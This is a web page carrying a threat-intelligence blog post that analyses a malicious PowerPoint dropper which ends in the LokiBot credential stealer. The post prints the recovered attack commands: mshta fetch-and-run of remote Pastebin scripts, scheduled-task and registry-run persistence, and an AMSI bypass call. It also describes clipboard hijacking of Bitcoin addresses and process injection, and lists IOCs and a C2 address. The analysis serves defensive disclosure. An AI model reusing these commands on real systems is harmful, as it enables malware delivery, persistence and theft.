<!DOCTYPE html>
<html lang="en-GB">
<head >
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />

<!-- Author Meta Tags by Molongui Authorship, visit: https://wordpress.org/plugins/molongui-authorship/ -->
<meta name="author" content="JagaimoKawaii">
<!-- /Molongui Authorship -->

<title>A twisted malware infection chain</title>
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="lab52 &raquo; Feed" href="https://lab52.io/blog/feed/" />
<link rel="alternate" type="application/rss+xml" title="lab52 &raquo; Comments Feed" href="https://lab52.io/blog/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="lab52 &raquo; A twisted malware infection chain Comments Feed" href="https://lab52.io/blog/a-twisted-malware-infection-chain/feed/" />
<link rel="canonical" href="https://lab52.io/blog/a-twisted-malware-infection-chain/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/lab52.io\/blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.13"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='atomic-blocks-fontawesome-css'  href='https://lab52.io/blog/wp-content/plugins/atomic-blocks/dist/assets/fontawesome/css/all.min.css?ver=1598525594' type='text/css' media='all' />
<link rel='stylesheet' id='genesis-sample-css'  href='https://lab52.io/blog/wp-content/themes/genesis-sample-develop/style.css?ver=2.9.2-dev' type='text/css' media='all' />
<style id='genesis-sample-inline-css' type='text/css'>

		.wp-custom-logo .title-area {
			padding-top: 7px;
		}
		
</style>
<link rel='stylesheet' id='wp-block-library-css'  href='https://lab52.io/blog/wp-includes/css/dist/block-library/style.min.css?ver=5.5.13' type='text/css' media='all' />
<link rel='stylesheet' id='atomic-blocks-style-css-css'  href='https://lab52.io/blog/wp-content/plugins/atomic-blocks/dist/blocks.style.build.css?ver=1598525594' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://lab52.io/blog/wp-includes/css/dashicons.min.css?ver=5.5.13' type='text/css' media='all' />
<link rel='stylesheet' id='genesis-sample-gutenberg-css'  href='https://lab52.io/blog/wp-content/themes/genesis-sample-develop/lib/gutenberg/front-end.css?ver=2.9.2-dev' type='text/css' media='all' />
<style id='genesis-sample-gutenberg-inline-css' type='text/css'>
.ab-block-post-grid .ab-post-grid-items h2 a:hover {
	color: #0073e5;
}

.site-container .wp-block-button .wp-block-button__link {
	background-color: #0073e5;
}

.wp-block-button .wp-block-button__link:not(.has-background),
.wp-block-button .wp-block-button__link:not(.has-background):focus,
.wp-block-button .wp-block-button__link:not(.has-background):hover {
	color: #ffffff;
}

.site-container .wp-block-button.is-style-outline .wp-block-button__link {
	color: #0073e5;
}

.site-container .wp-block-button.is-style-outline .wp-block-button__link:focus,
.site-container .wp-block-button.is-style-outline .wp-block-button__link:hover {
	color: #2396ff;
}		.site-container .has-small-font-size {
			font-size: 12px;
		}		.site-container .has-normal-font-size {
			font-size: 18px;
		}		.site-container .has-large-font-size {
			font-size: 20px;
		}		.site-container .has-larger-font-size {
			font-size: 24px;
		}		.site-container .has-theme-primary-color,
		.site-container .wp-block-button .wp-block-button__link.has-theme-primary-color,
		.site-container .wp-block-button.is-style-outline .wp-block-button__link.has-theme-primary-color {
			color: #0073e5;
		}

		.site-container .has-theme-primary-background-color,
		.site-container .wp-block-button .wp-block-button__link.has-theme-primary-background-color,
		.site-container .wp-block-pullquote.is-style-solid-color.has-theme-primary-background-color {
			background-color: #0073e5;
		}		.site-container .has-theme-secondary-color,
		.site-container .wp-block-button .wp-block-button__link.has-theme-secondary-color,
		.site-container .wp-block-button.is-style-outline .wp-block-button__link.has-theme-secondary-color {
			color: #0073e5;
		}

		.site-container .has-theme-secondary-background-color,
		.site-container .wp-block-button .wp-block-button__link.has-theme-secondary-background-color,
		.site-container .wp-block-pullquote.is-style-solid-color.has-theme-secondary-background-color {
			background-color: #0073e5;
		}
</style>
<link rel='stylesheet' id='simple-social-icons-font-css'  href='https://lab52.io/blog/wp-content/plugins/simple-social-icons/css/style.css?ver=3.0.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpgdprc.css-css'  href='https://lab52.io/blog/wp-content/plugins/wp-gdpr-compliance/assets/css/front.min.css?ver=1592813009' type='text/css' media='all' />
<style id='wpgdprc.css-inline-css' type='text/css'>

            div.wpgdprc .wpgdprc-switch .wpgdprc-switch-inner:before { content: 'Yes'; }
            div.wpgdprc .wpgdprc-switch .wpgdprc-switch-inner:after { content: 'No'; }
        
</style>
<script type='text/javascript' src='https://lab52.io/blog/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp' id='jquery-core-js'></script>
<script type='text/javascript' src='https://lab52.io/blog/wp-content/plugins/simple-social-icons/svgxuse.js?ver=1.1.21' id='svg-x-use-js'></script>
<link rel="https://api.w.org/" href="https://lab52.io/blog/wp-json/" /><link rel="alternate" type="application/json" href="https://lab52.io/blog/wp-json/wp/v2/posts/922" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://lab52.io/blog/xmlrpc.php?rsd" />
<link rel="alternate" type="application/json+oembed" href="https://lab52.io/blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flab52.io%2Fblog%2Fa-twisted-malware-infection-chain%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://lab52.io/blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flab52.io%2Fblog%2Fa-twisted-malware-infection-chain%2F&#038;format=xml" />
<style type="text/css"> .enews .screenread {
	height: 1px;
    left: -1000em;
    overflow: hidden;
    position: absolute;
    top: -1000em;
    width: 1px; } </style>        <style>
            .molongui-disabled-link
            {
                border-bottom: none !important;
                text-decoration: none !important;
                color: inherit !important;
                cursor: inherit !important;
            }
            .molongui-disabled-link:hover,
            .molongui-disabled-link:hover span
            {
                border-bottom: none !important;
                text-decoration: none !important;
                color: inherit !important;
                cursor: inherit !important;
            }
        </style>
        <link rel="pingback" href="https://lab52.io/blog/xmlrpc.php" />
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-95M8JQNZBF"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-95M8JQNZBF');
</script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-138573737-1');
</script>
<link rel="stylesheet" id="custom" href="/blog/wp-content/themes/genesis-sample-develop/custom.css" type="text/css" media="all">


<link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css" />
<script src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js"></script>

<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#edeff5",
      "text": "#838391"
    },
    "button": {
      "background": "#4b81e8"
    }
  },
  "theme": "classic",
  "content": {
    "message": "We use our own and third-party cookies to improve and analyze your use of our site. You can change the settings, reject them or get more information about our cookie policy",
    "href": "/cookie_policy"
  }
})});
</script><link rel="icon" href="https://lab52.io/blog/wp-content/uploads/2019/03/cropped-logo-Lab52-32x32.png" sizes="32x32" />
<link rel="icon" href="https://lab52.io/blog/wp-content/uploads/2019/03/cropped-logo-Lab52-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://lab52.io/blog/wp-content/uploads/2019/03/cropped-logo-Lab52-180x180.png" />
<meta name="msapplication-TileImage" content="https://lab52.io/blog/wp-content/uploads/2019/03/cropped-logo-Lab52-270x270.png" />
</head>
<body class="post-template-default single single-post postid-922 single-format-standard wp-custom-logo wp-embed-responsive header-full-width full-width-content genesis-breadcrumbs-hidden genesis-footer-widgets-visible first-block-core-paragraph" itemscope itemtype="https://schema.org/WebPage"><div class="site-container"><ul class="genesis-skip-link"><li><a href="#genesis-nav-primary" class="screen-reader-shortcut"> Skip to primary navigation</a></li><li><a href="#genesis-content" class="screen-reader-shortcut"> Skip to main content</a></li><li><a href="#genesis-footer-widgets" class="screen-reader-shortcut"> Skip to footer</a></li></ul><header class="site-header" itemscope itemtype="https://schema.org/WPHeader"><div class="wrap"><div class="title-area"><a href="https://lab52.io/blog/" class="custom-logo-link" rel="home"><img width="150" height="56" src="https://lab52.io/blog/wp-content/uploads/2019/03/lab52.png" class="custom-logo" alt="lab52" /></a><p class="site-title" itemprop="headline"><a href="https://lab52.io/blog/">lab52</a></p><p class="site-description" itemprop="description">The threat intelligence division of S2 Grupo</p></div><nav class="nav-primary" aria-label="Main" itemscope itemtype="https://schema.org/SiteNavigationElement" id="genesis-nav-primary"><div class="wrap"><ul id="menu-header-menu" class="menu genesis-nav-menu menu-primary js-superfish"><li id="menu-item-35" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-35"><a href="/" itemprop="url"><span itemprop="name">Home</span></a></li>
<li id="menu-item-36" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-36"><a href="/faq" itemprop="url"><span itemprop="name">Faq</span></a></li>
<li id="menu-item-167" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-167"><a href="/blog" itemprop="url"><span itemprop="name">Blog</span></a></li>
<li id="menu-item-38" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-38"><a href="/about" itemprop="url"><span itemprop="name">About</span></a></li>
<li id="menu-item-39" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-39"><a href="/contact" itemprop="url"><span itemprop="name">Contact</span></a></li>
</ul></div></nav></div></header><div class="site-inner"><div class="content-sidebar-wrap"><main class="content" id="genesis-content"><article class="post-922 post type-post status-publish format-standard has-post-thumbnail category-uncategorised entry" aria-label="A twisted malware infection chain" itemscope itemtype="https://schema.org/CreativeWork"><header class="entry-header"><h1 class="entry-title" itemprop="headline">A twisted malware infection chain</h1>
<p class="entry-meta"><time class="entry-time" itemprop="datePublished" datetime="2020-08-26T13:58:00+02:00">August 26, 2020</time></p></header><div class="entry-content" itemprop="text">
<p>Recently, a malware dropper received by mail has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries.</p>



<p>Firstly, it is characteristic that it lands on the victim in PPT format, while it has been much more common to find DOC or XLS extensions being used for this purpose.</p>



<p>The document has no content, but when you close the PPT viewer, the following window shows up:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="198" height="191" src="https://lab52.io/blog/wp-content/uploads/2020/08/1.png" alt="" class="wp-image-923"/></figure></div>



<p>This window is generated by the macros contained in the On_Close function, which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions. This macro have the following slightly obfuscated code:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="569" height="302" src="https://lab52.io/blog/wp-content/uploads/2020/08/2.png" alt="" class="wp-image-924" srcset="https://lab52.io/blog/wp-content/uploads/2020/08/2.png 569w, https://lab52.io/blog/wp-content/uploads/2020/08/2-300x159.png 300w" sizes="(max-width: 569px) 100vw, 569px" /></figure></div>



<p>Note that, before the &#8220;MsgBox&#8221;, it executes &#8220;Shell&#8221; with two concatenated variables. If we look at the content of those two variables, we can see that they contain the following string: &#8220;mshta.exe https://j.]mp/kasasjdoopoopasdskdd&#8221;, which causes the legitimate Windows interpreter &#8220;mshta&#8221; to execute a script hosted on the web that follows.</p>



<p>In fact, this address only redirects to the following link in Pastebin: https://pastebin.com/mqRZ7CBC, which contains the following obfuscated script:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="736" height="201" src="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-26-12-55-21.png" alt="" class="wp-image-928" srcset="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-26-12-55-21.png 736w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-26-12-55-21-300x82.png 300w" sizes="(max-width: 736px) 100vw, 736px" /></figure></div>



<p>After cleaning up the script a bit, we can see that it triggers the execution of the following commands:</p>



<figure class="wp-block-table"><table><tbody><tr><td>&#8216;id1<br>run mshta.exe &#8220;https://pastebin.com\raw\ZnhyvWAU&#8221;<br>run schtasks.exe &#8220;C:\Windows\System32\schtasks.exe&#8221; /create /sc MINUTE /mo 60 /tn &#8220;xesefiliym&#8221; /tr &#8220;mshta.exe &#8220;https://pastebin.com\raw\ZnhyvWAU&#8221; /F<br>&#8216;id2<br>run reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\trats2di =&gt; mshta.exe &#8220;https://pastebin.com\raw\d7kxMSZd&#8221;<br>&#8216;id3<br>run reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ =&gt; mshta.exe &#8220;https://pastebin.com\raw\VJDyrCD2&#8221;<br>&#8216;defid<br>run mshta.exe &#8220;https://pastebin.com\raw\9dva5i24&#8221;<br>run reg add HKCU\\Software\\Microsoft\\Windows notepad\\CurrentVersion\\Run\\rednefed =&gt; mshta.exe &#8220;https://pastebin.com\raw\9dva5i24&#8221;</td></tr></tbody></table></figure>



<p>Basically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.</p>



<p>The execution of each of the 4 scripts is preceded by one of the following identifiers &#8220;<strong>id1</strong>, <strong>id2</strong>, <strong>id3</strong> and <strong>defid</strong>&#8220;.</p>



<p>Since the script executed by <strong>id1</strong> is the most complex, we will leave it for the end of the post and we will focus first on the other 3 in order of complexity.</p>



<p><strong>id3</strong> does not run anything, probably the author who is using this dropper did not need it and left it free, pointing to the next script hosted in Pastebin:</p>



<figure class="wp-block-table"><table><tbody><tr><td>&lt;script language=&#8221;&amp;#86;&amp;#66;&amp;#83;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&#8221;&gt;<br>self.close<br>&lt;/script&gt;</td></tr></tbody></table></figure>



<p><strong>id2</strong> consists of a small script in powershell, which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard. In case that the copied string is a Bitcoin address, it replaces it with the attacker&#8217;s Bitcoin address, in order to make the user deposit money into the actor&#8217;s account:</p>



<p><script src="https://gist.github.com/Bondey/8c758bc6d5dd346bdce4f66c1056f0c5.js"></script></p>



<p>In this case, although the script is capable of storing up to four bitcoin addresses, the script only has one repeated four times (19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W), from which has been possible to identify different sources that did not have much activity:</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png" alt="" class="wp-image-932" width="384" height="347" srcset="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png 582w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54-300x271.png 300w" sizes="(max-width: 384px) 100vw, 384px" /></figure></div>



<p><strong>Defid</strong>, on the other hand, points to another script, which downloads from Pastebin a base64 encoded file, which has been inverted and where the &#8220;0&#8221; characters have been replaced by the &#8220;.&#8221; character in order to make its analysis more difficult:</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png" alt="" class="wp-image-933" width="399" height="137" srcset="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png 362w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14-300x103.png 300w" sizes="(max-width: 399px) 100vw, 399px" /></figure></div>



<p>After sorting and decoding it, we obtain a small executable developed in .Net and without obfuscation whose only purpose is to drop in the system a .vbs file that disables a large number of system security policies, including those of Windows Defender and MS Office.</p>



<figure class="wp-block-gallery aligncenter columns-1 is-cropped"><ul class="blocks-gallery-grid"><li class="blocks-gallery-item"><figure><img loading="lazy" width="1024" height="295" src="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png" alt="" data-id="934" data-full-url="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1.png" data-link="https://lab52.io/blog/?attachment_id=934" class="wp-image-934" srcset="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png 1024w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-300x86.png 300w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-768x221.png 768w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1.png 1137w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></li></ul></figure>



<p>Finally, the script executed by <strong>id1</strong> after being cleaned up a bit, contains the following relevant commands:</p>



<p><script src="https://gist.github.com/Bondey/75e0110e1d87a20e3048be6098d31b39.js"></script></p>



<p>This script, first of all leaves some kind words for the analyst who is reviewing the execution flow of this threat, and informs us that he would like to change it’s job :). In terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the &#8220;<strong>Defid</strong>&#8221; executable. Once downloaded and deobfuscated, it loads them with &#8220;[System.Reflection.Assembly]::Load(XXX)&#8221; which allows him to directly call functions within these binaries from PowerShell.</p>



<p>The call to the first binary loaded, is as follows</p>



<figure class="wp-block-table"><table><tbody><tr><td>$blind=[System.Reflection.Assembly]::Load($deblindB)<br>[Amsi]::Bypass()</td></tr></tbody></table></figure>



<p>The name of the funcion and class being called gives clues of its purpose. The binary is obfuscated with ConfuserEx, therefore using some tool for the analysis, such as &#8220;de4dot-cex&#8221;, can make easier to analyze its content.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img loading="lazy" width="1024" height="419" src="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-1024x419.png" alt="" class="wp-image-936" srcset="https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-1024x419.png 1024w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-300x123.png 300w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-768x314.png 768w, https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27.png 1097w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>It consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique &#8220;https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell&#8221;.</p>



<p>After this, it downloads <strong>a third executable</strong> from Pastebin, decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function &#8220;Chris()&#8221; passing as parameters the string &#8220;notepad.exe&#8221; and the variable that contains the third executable.</p>



<p>This second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a <strong>non</strong> .Net executable inside another process that is not .Net either.</p>



<p>That is, it creates a legitimate notepad process, and injects into it the third binary it has downloaded.</p>



<p>This last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures.</p>



<p>It is interesting that, up to this point, this campaign coincides in many points with <a href="https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162">the following report</a> related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.</p>



<p>The sample command and control server is &#8220;http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM&#8221; and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.</p>



<p></p>



<p>IOCs</p>



<figure class="wp-block-table"><table><tbody><tr><td>http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM</td></tr><tr><td>https://j.mp/kasasjdoopoopasdskdd</td></tr><tr><td>https://pastebin.com/raw/ZnhyvWAU</td></tr><tr><td>https://pastebin.com/raw/d7kxMSZd</td></tr><tr><td>https://pastebin.com/raw/VJDyrCD2</td></tr><tr><td>https://pastebin.com/raw/9dva5i24</td></tr><tr><td>https://pastebin.com/raw/n9Zadz2P</td></tr><tr><td>https://pastebin.com/raw/XCXpMvQC</td></tr><tr><td>https://pastebin.com/raw/UTLkgL5Y</td></tr></tbody></table></figure>

<!-- MOLONGUI AUTHORSHIP PLUGIN 4.7.4 -->
<!-- https://www.molongui.com/authorship/ -->

<div class="molongui-clearfix"></div>
<div id="mab-2179147678"
     class="m-a-box "
          data-plugin-release="4.7.4"
     data-plugin-version="lite"
     data-box-layout="slim"
     data-box-position="below"
     data-multiauthor="false"
     data-author-id="5"
     data-author-type="user"
     data-author-archived="">

	
    <div class="m-a-box-container">

        <div class="m-a-box-tab m-a-box-content m-a-box-profile"
             data-profile-layout="layout-1"
             data-author-ref="user-5"
             itemscope itemid="https://lab52.io/blog/author/jagaimokawaii/" itemtype="https://schema.org/Person"        >
            
<div class="m-a-box-content-top">

	
</div><!-- End of .m-a-box-content-top -->

<div class="m-a-box-content-middle">

    <!-- Author picture -->
    
	<div class="m-a-box-item m-a-box-avatar" data-source="local">
		                <a class="m-a-box-avatar-url" href="">
                    <img src="https://lab52.io/blog/wp-content/uploads/2019/03/flask-150x150.png" width="150" height="150" alt="Avatar" class="avatar avatar-150 wp-user-avatar wp-user-avatar-150 photo avatar-default" />                </a>
                	</div>

    <!-- Author social -->
    
    <!-- Author data -->
    <div class="m-a-box-item m-a-box-data">

        <!-- Author name -->
        
<div class="m-a-box-name m-a-box-title">
	<h5 >
                        <a class="m-a-box-name-url " href="https://lab52.io/blog/author/jagaimokawaii/" >
		            JagaimoKawaii                </a>
	            	</h5>
</div>
        <!-- Author metadata -->
        
<div class="m-a-box-item m-a-box-meta">

    
    
    
	
	
	
	        		<script type="text/javascript" language="JavaScript">
			if ( typeof window.ToggleAuthorshipData === 'undefined' )
			{
				function ToggleAuthorshipData(id, author)
				{
					let box_selector = '#mab-' + id;
                    let box = document.querySelector(box_selector);
                    if ( box.getAttribute('data-multiauthor') ) box_selector = '#mab-' + id + ' [data-author-ref="' + author + '"]';
                    let label = document.querySelector(box_selector + ' ' + '.m-a-box-data-toggle');
					label.innerHTML = ( label.text.trim() === "+ posts" ? " <span class=\"m-a-box-string-bio\">Bio</span>" : " <span class=\"m-a-box-string-more-posts\">+ posts</span>" );
                    let bio     = document.querySelector(box_selector + ' ' + '.m-a-box-bio');
                    let related = document.querySelector(box_selector + ' ' + '.m-a-box-related-entries');

					if ( related.style.display === "none" )
					{
						related.style.display = "block";
						bio.style.display     = "none";
					}
					else
					{
						related.style.display = "none";
						bio.style.display     = "block";
					}
				}
			}
		</script>
		<a href="javascript:ToggleAuthorshipData(2179147678, 'user-5')" class="m-a-box-data-toggle" > <span class="m-a-box-string-more-posts">+ posts</span> </a>
	
</div><!-- End of .m-a-box-meta -->

        <!-- Author bio -->
        
<div class="m-a-box-bio" >
    </div>

        
            <!-- Author related posts -->
            <div class="m-a-box-related" data-related-layout="layout-1">
                <div class="m-a-box-item m-a-box-related-entries" style="display: none;">

                    <ul>
                         <span class="m-a-box-string-no-related-posts">This author does not have any more posts.</span>                    </ul>

                </div><!-- End of .m-a-box-related-entries -->
            </div><!-- End of .m-a-box-related -->

        
    </div><!-- End of .m-a-box-data -->

</div><!-- End of .m-a-box-content-middle -->

<div class="m-a-box-content-bottom"></div><!-- End of .m-a-box-content-bottom -->        </div><!-- End of .m-a-box-profile -->

        
    </div><!-- End of .m-a-box-container -->

	
</div><!-- End of .m-a-box --><!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://lab52.io/blog/a-twisted-malware-infection-chain/"
    dc:identifier="https://lab52.io/blog/a-twisted-malware-infection-chain/"
    dc:title="A twisted malware infection chain"
    trackback:ping="https://lab52.io/blog/a-twisted-malware-infection-chain/trackback/" />
</rdf:RDF>-->
</div><footer class="entry-footer"><p class="entry-meta"> <span class="entry-author" itemprop="author" itemscope itemtype="https://schema.org/Person"><a href="https://lab52.io/blog/author/jagaimokawaii/" class="entry-author-link" rel="author" itemprop="url"><span class="entry-author-name" itemprop="name">JagaimoKawaii</span></a></span></p></footer></article><h2 class="screen-reader-text">Reader Interactions</h2>	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/blog/a-twisted-malware-infection-chain/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://lab52.io/blog/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required='required' /></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required='required' /></p>
<div class="anr_captcha_field"><div id="anr_captcha_field_1" class="anr_captcha_field_div"></div></div><p class="wpgdprc-checkbox"><input type="checkbox" name="wpgdprc" id="wpgdprc" value="1" /><label for="wpgdprc">I hereby declare to have read and accepted the <a href="/legal_note">legal notice</a> and the <a href="/privacy_policy">privacy policy</a>. <abbr class="wpgdprc-required" title="You need to accept this checkbox.">*</abbr></label></p><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='922' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p></form>	</div><!-- #respond -->
	<div class="related"><h3 class="related-title">Related</h3><div class="related-posts"><div class="related-post"><a href="https://lab52.io/blog/2344-2/" rel="bookmark" title="Permanent Link to New invitation from APT29 to use CCleaner"><img width="400" height="222" src="https://lab52.io/blog/wp-content/uploads/2023/07/Image20230712114555-400x222.jpg" class="related-post-image" alt="" loading="lazy" /></a><div class="related-post-info"><a class="related-post-title" href="https://lab52.io/blog/2344-2/" rel="bookmark" title="Permanent Link to New invitation from APT29 to use CCleaner">New invitation from APT29 to use CCleaner</a><div class="related-post-date"><time class="entry-time" itemprop="datePublished" datetime="2023-07-12T16:35:00+02:00">July 12, 2023</time></div><div class="related-post-tags"><span class="entry-tags">Tags: <a href="https://lab52.io/blog/tag/apt29/" rel="tag">APT29</a>, <a href="https://lab52.io/blog/tag/ccleaner/" rel="tag">CCleaner</a>, <a href="https://lab52.io/blog/tag/dllside-load/" rel="tag">DLLSide-Load</a>, <a href="https://lab52.io/blog/tag/phishing/" rel="tag">phishing</a>, <a href="https://lab52.io/blog/tag/russia/" rel="tag">Russia</a>, <a 